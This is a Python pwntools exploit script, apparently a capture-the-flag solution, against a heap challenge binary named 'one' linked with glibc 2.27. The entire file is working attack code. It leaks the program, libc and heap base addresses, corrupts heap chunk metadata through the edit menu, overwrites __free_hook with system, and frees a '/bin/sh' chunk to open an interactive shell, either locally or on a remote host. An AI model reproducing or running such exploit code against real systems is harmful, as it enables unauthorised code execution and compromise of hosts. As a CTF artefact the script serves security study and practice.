from pwn import *
from sys import argv
context.arch = 'amd64'
stat = argv[1]

if (stat == 'l'):
    io = process("./one")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elif (stat == 'd'or stat == 'r'):
    libc = ELF("./libc-2.27.so")
    if(stat == 'd'):
        io = process("./one", env = {"LD_PRELOAD":"./libc-2.27.so"})
    else:
        io = remote('0.0.0.0',4444)
else:
    info("STAT ERROR")
    exit()

def ch(c):
    io.sendlineafter(">> \n",str(c))

def addS(data):
    ch(1)
    io.sendafter(":\n",data)

def seeS(idx):
    ch(3)
    io.sendlineafter(":\n",str(idx))
    io.recvuntil("is:\n")
    return u64(io.recv(6).ljust(8,'\x00'))

def delS(idx):
    ch(4)
    io.sendlineafter(":\n",str(idx))

def chgS(idx,oldc,newc,gg = False):
    ch(2)
    io.sendlineafter(":\n",str(idx))
    if (gg == False):
        io.sendafter("edit:\n",oldc)
    else:
        io.sendlineafter("edit:\n",oldc)
    if(io.recv(6)=='Sorry,'):
        return False
    io.sendlineafter("into:\n",newc)
    return True

def one():
    ch(12580)
    io.sendlineafter("(Y/N)\n","Y")
    io.sendlineafter("test?\n",str(0x80000000))
    io.recvuntil(":\n")
    leak = u64(io.recv(6).ljust(8,'\x00'))
    return leak

def obw(idx,offset,dstold,dstnow,_gg0,_gg1,_gg2,start = 0x7f):
    for i in range(offset):
        chgS(idx,'\x00',chr(i+start+1),gg = _gg0)
    chgS(idx,dstold,dstnow,gg = _gg1)
    for i in range(offset,0,-1):
        chgS(idx,chr(i+start),'\x00',gg = _gg2)

def bom_addr(idx,offset,_gg0,_gg1,_gg2,_gg3,_gg4,_gg5,_gg6):
    for i in range(offset):
        chgS(idx,'\x00','b',gg = _gg0)
    for i in range(8):
        chgS(idx,'\x00',chr(i+1),gg = _gg1)
    data = []
    nlist = range(9,256);nlist.remove(0xa);nlist.remove(0x61);nlist.remove(0x62);
    for j in nlist:
        if(chgS(idx,chr(j),chr(j),gg = _gg2) == True):
            data.append(j)
    if(len(data)!=6):
        exit()
    addr = 0
    for i in data:
        chgS(idx,chr(i),'\x00',gg = _gg3)
        off = 0
        for k in data:
            if(chgS(idx,chr(k),chr(k),gg = _gg5) == True and k != i):
                off = off+1
        addr += (i << (8*off))
        chgS(idx,'\x00',chr(i),gg = _gg4)
    #recover!
    for i in range(7,-1,-1):
        chgS(idx,chr(i+1),'\x00',gg = _gg6)
    return (data,addr)

def gtop(num):
    if (num > 0x7fffffffffff or num < 0x500000000000):
        return 0xb8
    data = []
    for i in range(6):
        data.append(num-((num>>8)<<8))
        num = (num >> 8)
    return max(data)

proc_base = one()-(0x55f3e29a40c0-0x55f3e27a1000)
info("PROC BASE -> %#x"%proc_base)
addS('a'*0x20)	#0
addS('a'*0x20)	#1
addS('a'*0x20)	#2
addS('b'*0x20)	#3
addS('a'*0x20)	#4
addS('a'*0x20)	#5
addS('a'*0x20)	#6
addS('a'*0x20)	#7
addS('a'*0x20)	#8
addS("/bin/sh;\n")	#9
addS('a'*0x20)	#10
addS('a'*0x20)
addS('a'*0x20)
addS('a'*0x20)
addS('a'*0x20)
addS('a'*0x20)
addS('a'*0x20)
addS('a'*0x20)
addS('a'*0x20)	#18

obw(0,0x18,'\x41','\x00',False,True,True)
obw(0,0x19,'\x00','\x04',False,False,True)
obw(0,0x18,'\x00','\x41',False,False,True)
delS(1)
obw(0,0x18,'\x41','\x00',False,True,True,start = 0xb8)
obw(0,0x19,'\x04','\x00',False,True,True)
(dt,ma) = bom_addr(0,0x18,False,False,True,True,False,True,True)
libc_base = ma-(libc.sym['__malloc_hook']+0x10+96)
info("LIBC BASE -> %#x"%libc_base)
chgS(0,'\x00','\x41')
chgS(0,'\x00','\x04')

obw(2,0x18,'\x41','\x00',False,True,True)
for i in range(0x20):
    obw(3,i,'\x62','\x00',False,True,True)
for i in range(5,-1,-1):
    obw(3,0x18+i,'\x00',p64(proc_base+0x2030d8-0x10)[i:i+1],False,False,True)
for i in range(5,-1,-1):
    obw(3,0x10+i,'\x00',p64(proc_base+0x2030d8-0x18)[i:i+1],False,False,True)
obw(2,0x28,'\x00','\xb1',False,False,True)
obw(2,0x18,'\x00','\x41',False,False,True)
obw(5,0x18,'\x41','\xc0',False,True,True)
obw(5,0x10,'\x00','\xb0',False,False,True)

for i in range(7):
    obw(10+i,0x18,'\x41','\xc0',False,True,True)
for i in range(7):
    delS(11+i)
delS(6)
heap_base = seeS(3)-0x350
info("HEAP BASE -> %#x"%heap_base)

pay = heap_base+0x350
for i in range(6):
    obw(3,i,p64(pay)[i:i+1],'\x00',False,True,True,start = gtop())

pay = libc_base+libc.sym['__free_hook']
for i in range(5,-1,-1):
    obw(3,i,'\x00',p64(pay)[i:i+1],False,False,True,start = gtop(pay))

pay = libc_base+libc.sym['system']
for i in range(5,-1,-1):
    obw(0,i,'\x00',p64(pay)[i:i+1],False,False,True,start = gtop(pay))

delS(9)

io.interactive()

